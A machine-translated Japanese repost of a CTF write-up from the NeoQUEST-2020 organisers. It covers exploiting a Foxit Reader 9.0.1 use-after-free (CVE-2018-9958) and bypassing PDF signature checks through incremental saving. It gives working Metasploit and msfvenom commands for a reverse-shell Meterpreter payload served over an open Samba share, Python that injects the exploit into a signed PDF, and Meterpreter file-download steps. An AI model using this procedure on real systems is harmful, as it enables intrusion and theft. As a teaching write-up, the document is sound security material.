<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🧕🏿 🛥️ 🐎 Foxit Readerの脆弱性を悪用し、NeoQUEST-2020タスクの例でデジタル署名をバイパスします 🕕 🖕🏽 🔝</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="今日は、最も難しいタスクであるNeoQUEST- 2019 2020 についてお話しします。そうですね、デジタル署名とFoxit Readerの脆弱性の悪用についても同じです。はい、はい、そうです。このタスクには2つのバージョンがあります。この記事では、最終的に適切に分析します。猫へようこそ:)
 ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Foxit Readerの脆弱性を悪用し、NeoQUEST-2020タスクの例でデジタル署名をバイパスします</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/neobit/blog/499144/"><img align="left" src="https://habrastorage.org/webt/sv/-v/nd/sv-vndk3jppts2pjo9tm0aeryly.png"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">今日は、最も難しいタスクであるNeoQUEST- </font></font><s><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2019</font></font></s><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 2020 </font><font style="vertical-align: inherit;">についてお話しします。そうですね</font><font style="vertical-align: inherit;">、デジタル署名とFoxit Readerの脆弱性の悪用についても同じです。</font><font style="vertical-align: inherit;">はい、はい、そうです。このタスクには2つのバージョンがあります。この記事では、最終的に適切に分析します。</font><font style="vertical-align: inherit;">猫へようこそ:)</font></font><br>
<a name="habracut"></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
当初、このタスクは</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NeoQUEST-2019</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">に対抗するように設計されて</font><font style="vertical-align: inherit;">いましたが、</font></font><s><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未</font></font></s><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">解決の</font><font style="vertical-align: inherit;">まま</font><font style="vertical-align: inherit;">でした。少し変更して、オンラインステージ</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NeoQUEST-2020の</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参加者を解決することを提案しました</font><font style="vertical-align: inherit;">。しかし、私たちの変更は割り当ての複雑さに影響を与えませんでした-たった2人が合格しました！</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、最初のバージョンはローカルネットワーク上で通過するために提供され、2番目のバージョンはグローバルインターネット上で提供されます。このバージョンでは、エクスプロイトとそのシェルコードを使用していくつかの操作を実行する必要があります。</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">NeoQUEST-2020の</font></a></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
伝説</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">移行時に参加者がアプリケーション提出フォームを見たIPアドレス、および要件のリストと正しいアプリケーションの例が与えられました。まず、ステートメントの例を注意深く検討します。そこに興味深いものがあるとしたらどうでしょうか。そして真実、私たちはすぐに詳細に気づきました：</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wq/k0/r8/wqk0r8zq0sgm-j3rqk3hwgoc2vi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Foxit Reader 9.0.1がここで使用されているようです。ソフトウェアの名前とそのバージョン、hmmmが与えられます...たぶん、これはある種の脆弱性ですか？そして、私たちは完全に正しいです。このバージョンには、識別子CVE-2018-9958を受け取った解放後使用の脆弱性があります。この脆弱性の悪用はMetasploitにあります（これはすでに成功の半分ですよね）。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この脆弱性により、リモートボールからファイルをダウンロードできるようになります。 2019年の元のタスクの例でこの脆弱性の悪用を検討してください。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、2019年の申請書提出フォームは192.168.108.129でした。</font><font style="vertical-align: inherit;">まず、Kali Linuxを起動します。</font><font style="vertical-align: inherit;">また、メインのペイロードが実行されるボールを上げる必要があります-Meterpreter。</font><font style="vertical-align: inherit;">これを行うには、sambaサーバーをダウンロード/更新します。</font></font><br>
<br>
<pre><code class="bash hljs">sudo apt-get install samba</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、作成するフォルダを作成します。</font></font><br>
<br>
<pre><code class="bash hljs">mkdir /mnt/files<font></font>
sudo chmod 777 /mnt/files<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、Sambaサーバーを構成する必要があります。</font><font style="vertical-align: inherit;">これを行うには、設定ファイル/etc/samba/smb.confを開き、そこに次のテキストを貼り付けます。</font></font><br>
<br>
<pre><code class="bash hljs">[global]<font></font>
security = user<font></font>
workgroup = MYGROUP<font></font>
server string = Samba<font></font>
guest account = nobody<font></font>
map to guest = Bad User<font></font>
<font></font>
[share]<font></font>
path = /mnt/files<font></font>
browseable = Yes<font></font>
guest ok = Yes<font></font>
writeable = Yes<font></font>
public = yes<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
最後に、Sambaサービスを再起動します。</font></font><br>
<br>
<pre><code class="bash hljs">service smbd restart<font></font>
service nmbd restart<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
それで全部です。</font><font style="vertical-align: inherit;">これで、/ mnt / filesフォルダーの内容が\\ 192.168.108.130 \共有にあります。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次のステップは、エクスプロイト自体を準備することです。</font><font style="vertical-align: inherit;">これを行うには、Meterpreterを構成してボールに置きます。</font></font><br>
<br>
<pre><code class="bash hljs">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.108.130 LPORT=4444 --arch x86 -f exe -o /mnt/files/exploit.exe<font></font>
sudo chmod 777 /mnt/files/exploit.exe<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、エクスプロイトPDFファイルを作成します。</font></font><br>
<br>
<pre><code class="bash hljs">msfconsole<font></font>
use exploit/windows/fileformat/foxit_reader_uaf<font></font>
<span class="hljs-built_in">set</span> LHOST 192.168.108.130
<span class="hljs-built_in">set</span> EXENAME exploit.exe
<span class="hljs-built_in">set</span> SHARE share<font></font>
run<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
犠牲ＰＣで起動した時にMeterpreterとの通信を確立するハンドラーを含みます：</font></font><br>
<br>
<pre><code class="bash hljs">use multi/handler
<span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp
<span class="hljs-built_in">set</span> LHOST 192.168.108.130
<span class="hljs-built_in">set</span> EXITONSESSION <span class="hljs-literal">false</span><font></font>
run -j<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
それで全部です！ 2020タスクのバージョンでは、この方法ではうまくいきません（SMBボールを上げることができる外部IPがない場合のみ）。したがって、オンラインフェーズでこのタスクを完了するには、エクスプロイトを分析し、そのペイロードをシェルコードとして入力する必要があります。これは、たとえばリバース（外部IPがある場合）またはバインドシェルを実装します。脆弱性を悪用することをお勧めします。100回読むよりも自分で行うほうが良いからです。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
作成されたPDF文書をアプリケーション受け入れシステムにアップロードするために残り、... </font></font><br>
<br>
<img src="https://habrastorage.org/webt/go/t4/t1/got4t1jdefqpv-bl4xe2kydoq68.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
...ファイルが署名されていないため、何も起こりません！システムがドキュメントをFoxit Readerで開く前に、追加の手段で署名をチェックしているようです。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、署名の検証を回避する方法を理解する必要があります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
PDFファイルの最新の3つの署名バイパス技術は、CVE-2018-16042、CVE-2018-18688、およびCVE-2018-18689で識別されています。</font><font style="vertical-align: inherit;">幸いにも、これらの脆弱性を発見した研究者のチームが検証用のPDFの例を公開しました。</font><font style="vertical-align: inherit;">システムが各攻撃にどのように応答するかを確認します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ユニバーサル署名偽造攻撃：システムの反応は、署名されていないファイルに対するものと同じです。</font><font style="vertical-align: inherit;">署名が認識されていないようです。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
署名ラッピング攻撃：同じ結果、攻撃は機能しません。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そして、これがインクリメンタルセービング攻撃攻撃です：</font></font><br>
<br>
<img src="https://habrastorage.org/webt/tp/9a/om/tp9aom9nelvrmrdwcfxfd0zkyeo.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
私たちは、ほぼ、そこにいる！</font><font style="vertical-align: inherit;">システムは署名をチェックし、会社の従業員のものではないことを報告しました。</font><font style="vertical-align: inherit;">しかし、従業員が署名した文書の例があります！</font><font style="vertical-align: inherit;">したがって、残っているのは、手利きを見せ、増分保存を使用して、署名を壊すことなくエクスプロイトを埋め込むことです。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
（タスク開発者が意図したように）pdfを使用して低レベルの作業用のライブラリを自分で作成するか、単に（タスクが完了したときにテスターが行ったように）エクスプロイトを最後に追加できます。 PDFエクスプロイトの構造を見ると、2つのオブジェクトで構成されていることが明らかになります。use-after-freeを呼び出してボール上でexeファイルを実行するJSコードと、アクションを設定するPDFファイルのメインオブジェクトであるディレクトリドキュメントを開くとき、JSコードを呼び出します。そのため、JSコードを含むオブジェクトを署名済みドキュメントに追加し、カタログオブジェクトを更新する必要があります。これは次のようにして行うことができます。</font></font><br>
<br>
<pre><code class="python hljs">doc = PDF(<span class="hljs-string">'example.pdf'</span>)<font></font>
js_exploit = <span class="hljs-string">"...  JS-..."</span><font></font>
<font></font>
obj_1 = Object({<span class="hljs-string">'OpenAction'</span>: ObjectReference(<span class="hljs-number">28</span>),
                <span class="hljs-string">'AcroForm'</span>: ObjectReference(<span class="hljs-number">15</span>),
                <span class="hljs-string">'Pages'</span>: ObjectReference(<span class="hljs-number">1</span>),
                <span class="hljs-string">'PageLayout'</span>: <span class="hljs-string">'/OneColumn'</span>,
                <span class="hljs-string">'Type'</span>: <span class="hljs-string">'/Catalog'</span>
                }, id=<span class="hljs-number">13</span>)<font></font>
doc.update_object(obj_1, <span class="hljs-number">1</span>)<font></font>
<font></font>
obj_2 = Object({<span class="hljs-string">'S'</span>: <span class="hljs-string">'/JavaScript'</span>,
                <span class="hljs-string">'JS'</span>: js_exploit<font></font>
                })<font></font>
doc.add_new_object(obj_2)<font></font>
<font></font>
doc.save(root_id=<span class="hljs-number">13</span>)
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
何が見える？ドキュメントは署名の検証に合格しました！その後、Meterpreterとの新しいセッションが確立されます。これは、エクスプロイトが機能することを意味します（解放後の使用の確率的性質により、これが最初に発生しない場合があります）。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/7_/2t/qw/7_2tqwtyheeandsbgomtdi-vzvk.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Meterpreterを使用して、nq2020_key.txtファイルを見つけてダウンロードできるようになりました。</font></font><br>
<br>
<pre><code class="bash hljs">sessions -i 1<font></font>
search -f nq2020_key.txt<font></font>
download <span class="hljs-string">'C:\Users\manager\Downloads\nq2020_key.txt
</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
万歳、</font></font><s><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ファンファーレ、拍手</font></font></s><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">！</font><font style="vertical-align: inherit;">やっと鍵が取れました！</font><font style="vertical-align: inherit;">難しいことでしたが、参加者にとって不可能ではありませんでした。これは何年にもわたって確信しています！</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
NeoQUEST-2020のオンラインステージのタスクのすべての秘密を伝えましたが、これは今年あな​​たに会えないという意味ではありません。9月30日に、伝統的な対立がサンクトペテルブルクで開催されます！</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ハッキングコンテストの最終戦を開催するとともに、サイバーセキュリティの世界で最も興味深いニュースについて話します。</font><font style="vertical-align: inherit;">かっこいいレポート、有益なワークショップ、電報クイズ、ギフトなど、すべてが間もなくあなたを待っています！</font><font style="vertical-align: inherit;">またね ：）</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja499130/index.html">BlockAdBlock広告アンチブロッキングリバースエンジニアリング</a></li>
<li><a href="../ja499134/index.html">ユーザーとのコミュニケーションを通じてLTV製品を増やすための4つのステップ</a></li>
<li><a href="../ja499136/index.html">#BeeFree、または...ビーライン-あなたは抵抗できませんでしたか？</a></li>
<li><a href="../ja499138/index.html">トポロジカルソーティング</a></li>
<li><a href="../ja499140/index.html">制御下での生成：強力な言語モデルを抑制する方法</a></li>
<li><a href="../ja499146/index.html">攻撃からMikrotikを保護する簡単な方法</a></li>
<li><a href="../ja499148/index.html">エアロゾルと二酸化塩素（ClO2）：これはどのように関連していますか？</a></li>
<li><a href="../ja499150/index.html">そして、フィールドの一人の戦士：チームなしで高品質のホスティングサービスを提供することは可能ですか</a></li>
<li><a href="../ja499152/index.html">DLLとPython</a></li>
<li><a href="../ja499154/index.html">モバイル＃342開発者向けの興味深い資料のダイジェスト（4月20〜26日）</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>